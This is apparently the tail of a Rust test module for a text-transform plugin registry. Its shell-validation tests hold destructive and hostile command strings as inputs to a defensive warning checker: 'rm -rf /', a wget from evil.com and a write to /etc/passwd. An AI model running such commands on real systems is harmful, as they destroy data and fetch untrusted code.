            registry.execute("kebab_case", "hello world", &[]).unwrap(),
            "hello-world"
        );
    }

    #[test]
    fn test_builtin_length() {
        let registry = PluginRegistry::new();
        assert_eq!(registry.execute("length", "hello", &[]).unwrap(), "5");
    }

    #[test]
    fn test_builtin_length_empty() {
        let registry = PluginRegistry::new();
        assert_eq!(registry.execute("length", "", &[]).unwrap(), "0");
    }

    #[test]
    fn test_builtin_length_unicode() {
        let registry = PluginRegistry::new();
        // Note: length counts bytes, not characters
        assert_eq!(registry.execute("length", "日", &[]).unwrap(), "3");
    }

    #[test]
    fn test_builtin_word_count() {
        let registry = PluginRegistry::new();
        assert_eq!(
            registry
                .execute("word_count", "hello world foo", &[])
                .unwrap(),
            "3"
        );
    }

    #[test]
    fn test_builtin_word_count_empty() {
        let registry = PluginRegistry::new();
        assert_eq!(registry.execute("word_count", "", &[]).unwrap(), "0");
    }

    #[test]
    fn test_builtin_word_count_extra_whitespace() {
        let registry = PluginRegistry::new();
        assert_eq!(
            registry
                .execute("word_count", "  hello   world  ", &[])
                .unwrap(),
            "2"
        );
    }

    #[test]
    fn test_builtin_line_count() {
        let registry = PluginRegistry::new();
        assert_eq!(
            registry
                .execute("line_count", "line1\nline2\nline3", &[])
                .unwrap(),
            "3"
        );
    }

    #[test]
    fn test_builtin_line_count_single() {
        let registry = PluginRegistry::new();
        assert_eq!(
            registry.execute("line_count", "single line", &[]).unwrap(),
            "1"
        );
    }

    #[test]
    fn test_builtin_char_freq() {
        let registry = PluginRegistry::new();
        let result = registry.execute("char_freq", "aaabbc", &[]).unwrap();
        // Should have 'a' as most frequent
        assert!(result.starts_with("a:3"));
    }

    #[test]
    fn test_builtin_hex_encode() {
        let registry = PluginRegistry::new();
        assert_eq!(registry.execute("hex_encode", "AB", &[]).unwrap(), "4142");
    }

    #[test]
    fn test_builtin_hex_decode() {
        let registry = PluginRegistry::new();
        assert_eq!(registry.execute("hex_decode", "4142", &[]).unwrap(), "AB");
    }

    #[test]
    fn test_builtin_hex_roundtrip() {
        let registry = PluginRegistry::new();
        let original = "Hello";
        let encoded = registry.execute("hex_encode", original, &[]).unwrap();
        let decoded = registry.execute("hex_decode", &encoded, &[]).unwrap();
        assert_eq!(decoded, original);
    }

    #[test]
    fn test_builtin_squeeze() {
        let registry = PluginRegistry::new();
        assert_eq!(
            registry
                .execute("squeeze", "hello   world  foo", &[])
                .unwrap(),
            "hello world foo"
        );
    }

    #[test]
    fn test_builtin_squeeze_tabs_and_newlines() {
        let registry = PluginRegistry::new();
        assert_eq!(
            registry
                .execute("squeeze", "hello\t\t\nworld", &[])
                .unwrap(),
            "hello world"
        );
    }

    #[test]
    fn test_builtin_strip_prefix() {
        let registry = PluginRegistry::new();
        assert_eq!(
            registry
                .execute("strip_prefix", "hello_world", &["hello_".to_string()])
                .unwrap(),
            "world"
        );
    }

    #[test]
    fn test_builtin_strip_prefix_no_match() {
        let registry = PluginRegistry::new();
        assert_eq!(
            registry
                .execute("strip_prefix", "hello_world", &["foo_".to_string()])
                .unwrap(),
            "hello_world"
        );
    }

    #[test]
    fn test_builtin_strip_suffix() {
        let registry = PluginRegistry::new();
        assert_eq!(
            registry
                .execute("strip_suffix", "hello_world", &["_world".to_string()])
                .unwrap(),
            "hello"
        );
    }

    #[test]
    fn test_builtin_strip_suffix_no_match() {
        let registry = PluginRegistry::new();
        assert_eq!(
            registry
                .execute("strip_suffix", "hello_world", &["_foo".to_string()])
                .unwrap(),
            "hello_world"
        );
    }

    #[test]
    fn test_builtin_increment() {
        let registry = PluginRegistry::new();
        assert_eq!(registry.execute("increment", "42", &[]).unwrap(), "43");
        assert_eq!(
            registry
                .execute("increment", "42", &["10".to_string()])
                .unwrap(),
            "52"
        );
    }

    #[test]
    fn test_builtin_increment_negative() {
        let registry = PluginRegistry::new();
        assert_eq!(registry.execute("increment", "-5", &[]).unwrap(), "-4");
    }

    #[test]
    fn test_builtin_increment_non_number() {
        let registry = PluginRegistry::new();
        assert_eq!(
            registry.execute("increment", "not_a_number", &[]).unwrap(),
            "not_a_number"
        );
    }

    #[test]
    fn test_builtin_decrement() {
        let registry = PluginRegistry::new();
        assert_eq!(registry.execute("decrement", "42", &[]).unwrap(), "41");
        assert_eq!(
            registry
                .execute("decrement", "42", &["10".to_string()])
                .unwrap(),
            "32"
        );
    }

    #[test]
    fn test_builtin_format_number() {
        let registry = PluginRegistry::new();
        assert_eq!(
            registry.execute("format_number", "1234567", &[]).unwrap(),
            "1,234,567"
        );
    }

    #[test]
    fn test_builtin_format_number_small() {
        let registry = PluginRegistry::new();
        assert_eq!(
            registry.execute("format_number", "123", &[]).unwrap(),
            "123"
        );
    }

    #[test]
    fn test_builtin_format_number_negative() {
        let registry = PluginRegistry::new();
        assert_eq!(
            registry.execute("format_number", "-1234567", &[]).unwrap(),
            "-1,234,567"
        );
    }

    #[test]
    fn test_builtin_timestamp() {
        let registry = PluginRegistry::new();
        let result = registry.execute("timestamp", "", &[]).unwrap();
        // Should be a valid Unix timestamp (non-empty numeric string)
        let ts: u64 = result.parse().unwrap();
        assert!(ts > 0);
    }

    #[test]
    fn test_custom_plugin() {
        let mut registry = PluginRegistry::new();
        registry.register("double", |s, _| format!("{}{}", s, s));
        assert_eq!(registry.execute("double", "hi", &[]).unwrap(), "hihi");
    }

    #[test]
    fn test_custom_plugin_with_args() {
        let mut registry = PluginRegistry::new();
        registry.register("wrap", |s, args| {
            let prefix = args.first().map(|a| a.as_str()).unwrap_or("[");
            let suffix = args.get(1).map(|a| a.as_str()).unwrap_or("]");
            format!("{}{}{}", prefix, s, suffix)
        });
        assert_eq!(
            registry
                .execute("wrap", "text", &["<".to_string(), ">".to_string()])
                .unwrap(),
            "<text>"
        );
    }

    #[test]
    fn test_custom_plugin_overrides_builtin() {
        let mut registry = PluginRegistry::new();
        registry.register("reverse", |s, _| format!("custom:{}", s));
        assert_eq!(
            registry.execute("reverse", "test", &[]).unwrap(),
            "custom:test"
        );
    }

    #[test]
    fn test_plugin_not_found() {
        let registry = PluginRegistry::new();
        let result = registry.execute("nonexistent", "test", &[]);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("not found"));
    }

    #[test]
    fn test_plugin_not_found_lists_available() {
        let registry = PluginRegistry::new();
        let result = registry.execute("nonexistent", "test", &[]);
        let err = result.unwrap_err();
        assert!(err.contains("reverse")); // Should list available plugins
    }

    #[test]
    fn test_has_plugin() {
        let registry = PluginRegistry::new();
        assert!(registry.has_plugin("reverse"));
        assert!(registry.has_plugin("snake_case"));
        assert!(!registry.has_plugin("nonexistent"));
    }

    #[test]
    fn test_list_plugins() {
        let registry = PluginRegistry::new();
        let plugins = registry.list_plugins();
        assert!(plugins.contains(&"reverse"));
        assert!(plugins.contains(&"snake_case"));
        assert!(plugins.contains(&"length"));
        assert!(plugins.contains(&"increment"));
        // Should be sorted
        assert!(plugins.windows(2).all(|w| w[0] <= w[1]));
    }

    #[test]
    fn test_default_trait() {
        let registry = PluginRegistry::default();
        assert!(registry.has_plugin("reverse"));
    }

    #[test]
    fn test_debug_trait() {
        let registry = PluginRegistry::new();
        let debug_str = format!("{:?}", registry);
        assert!(debug_str.contains("PluginRegistry"));
        assert!(debug_str.contains("reverse"));
    }

    #[test]
    fn test_clone_trait() {
        let registry = PluginRegistry::new();
        let cloned = registry.clone();
        assert!(cloned.has_plugin("reverse"));
        assert_eq!(registry.list_plugins().len(), cloned.list_plugins().len());
    }

    #[test]
    fn test_shell_command() {
        // Only run on Unix-like systems
        #[cfg(not(target_os = "windows"))]
        {
            let result = PluginRegistry::execute_shell("cat", "hello");
            assert_eq!(result.unwrap(), "hello");

            let result = PluginRegistry::execute_shell("tr 'a-z' 'A-Z'", "hello");
            assert_eq!(result.unwrap(), "HELLO");
        }
    }

    #[cfg(not(target_os = "windows"))]
    #[test]
    fn test_shell_command_with_newlines() {
        let result = PluginRegistry::execute_shell("cat", "line1\nline2");
        assert_eq!(result.unwrap(), "line1\nline2");
    }

    #[cfg(not(target_os = "windows"))]
    #[test]
    fn test_shell_command_failure() {
        let result = PluginRegistry::execute_shell("exit 1", "input");
        assert!(result.is_err());
    }

    #[cfg(not(target_os = "windows"))]
    #[test]
    fn test_shell_command_invalid() {
        let result = PluginRegistry::execute_shell("nonexistent_command_xyz", "input");
        assert!(result.is_err());
    }

    #[test]
    fn test_validate_shell_command_safe() {
        // Safe commands should return no warnings
        let warnings = PluginRegistry::validate_shell_command("cat");
        assert!(warnings.is_empty());

        let warnings = PluginRegistry::validate_shell_command("grep pattern");
        assert!(warnings.is_empty());

        let warnings = PluginRegistry::validate_shell_command("python -c 'print(1)'");
        assert!(warnings.is_empty());
    }

    #[test]
    fn test_validate_shell_command_dangerous_file_ops() {
        let warnings = PluginRegistry::validate_shell_command("rm -rf /");
        assert!(!warnings.is_empty());
        assert!(warnings.iter().any(|w| w.contains("removes files")));

        let warnings = PluginRegistry::validate_shell_command("mv file1 file2");
        assert!(!warnings.is_empty());
    }

    #[test]
    fn test_validate_shell_command_network() {
        let warnings = PluginRegistry::validate_shell_command("curl http://example.com");
        assert!(!warnings.is_empty());
        assert!(warnings.iter().any(|w| w.contains("network")));

        let warnings = PluginRegistry::validate_shell_command("wget http://evil.com/script.sh");
        assert!(!warnings.is_empty());
    }

    #[test]
    fn test_validate_shell_command_privilege() {
        let warnings = PluginRegistry::validate_shell_command("sudo rm -rf /");
        assert!(warnings.len() >= 2); // Both sudo and rm warnings

        let warnings = PluginRegistry::validate_shell_command("chmod 777 file");
        assert!(!warnings.is_empty());
    }

    #[test]
    fn test_validate_shell_command_redirection() {
        let warnings = PluginRegistry::validate_shell_command("echo test > /etc/passwd");
        assert!(!warnings.is_empty());
        assert!(warnings.iter().any(|w| w.contains("redirect")));

        let warnings = PluginRegistry::validate_shell_command("cat >> file.txt");
        assert!(!warnings.is_empty());
    }

    #[test]
    fn test_validate_shell_command_variable_expansion() {
        let warnings = PluginRegistry::validate_shell_command("echo $HOME");
        assert!(!warnings.is_empty());
        assert!(warnings.iter().any(|w| w.contains("variable")));
    }

    #[test]
    fn test_validate_shell_command_eval() {
        let warnings = PluginRegistry::validate_shell_command("eval $MALICIOUS");
        assert!(warnings.len() >= 2); // eval and variable warnings
    }

    #[test]
    fn test_validate_shell_command_substitution() {
        let warnings = PluginRegistry::validate_shell_command("echo $(whoami)");
        assert!(!warnings.is_empty());
        assert!(warnings.iter().any(|w| w.contains("substitution")));

        let warnings = PluginRegistry::validate_shell_command("echo `id`");
        assert!(!warnings.is_empty());
    }

    // Transpose plugin tests
    #[test]
    fn test_transpose_basic() {
        let registry = PluginRegistry::new();
        // C up 2 semitones = D
        assert_eq!(
            registry
                .execute("transpose", "C", &["2".to_string()])
                .unwrap(),
            "D"
        );
    }

    #[test]
    fn test_transpose_with_suffix() {
        let registry = PluginRegistry::new();
        // Am up 5 semitones = Dm
        assert_eq!(
            registry
                .execute("transpose", "Am", &["5".to_string()])
                .unwrap(),
            "Dm"
        );
    }

    #[test]
    fn test_transpose_complex_chord() {
        let registry = PluginRegistry::new();
        // Cmaj7 up 4 semitones = Emaj7
        assert_eq!(
            registry
                .execute("transpose", "Cmaj7", &["4".to_string()])
                .unwrap(),
            "Emaj7"
        );
    }

    #[test]
    fn test_transpose_sharp() {
        let registry = PluginRegistry::new();
        // F# up 2 semitones = G#
        assert_eq!(
            registry
                .execute("transpose", "F#", &["2".to_string()])
                .unwrap(),
            "G#"
        );
    }

    #[test]
    fn test_transpose_flat() {
        let registry = PluginRegistry::new();
        // Bb up 2 semitones = C
        assert_eq!(
            registry
                .execute("transpose", "Bb", &["2".to_string()])
                .unwrap(),
            "C"
        );
    }

    #[test]
    fn test_transpose_negative() {
        let registry = PluginRegistry::new();
        // D down 2 semitones = C
        assert_eq!(
            registry
                .execute("transpose", "D", &["-2".to_string()])
                .unwrap(),
            "C"
        );
    }

    #[test]
    fn test_transpose_wrap_around() {
        let registry = PluginRegistry::new();
        // B up 2 semitones = C#
        assert_eq!(
            registry
                .execute("transpose", "B", &["2".to_string()])
                .unwrap(),
            "C#"
        );
    }

    #[test]
    fn test_transpose_zero() {
        let registry = PluginRegistry::new();
        // No change
        assert_eq!(
            registry
                .execute("transpose", "Am7", &["0".to_string()])
                .unwrap(),
            "Am7"
        );
    }

    #[test]
    fn test_transpose_no_args() {
        let registry = PluginRegistry::new();
        // Default to 0 semitones (no change)
        assert_eq!(registry.execute("transpose", "C", &[]).unwrap(), "C");
    }
}
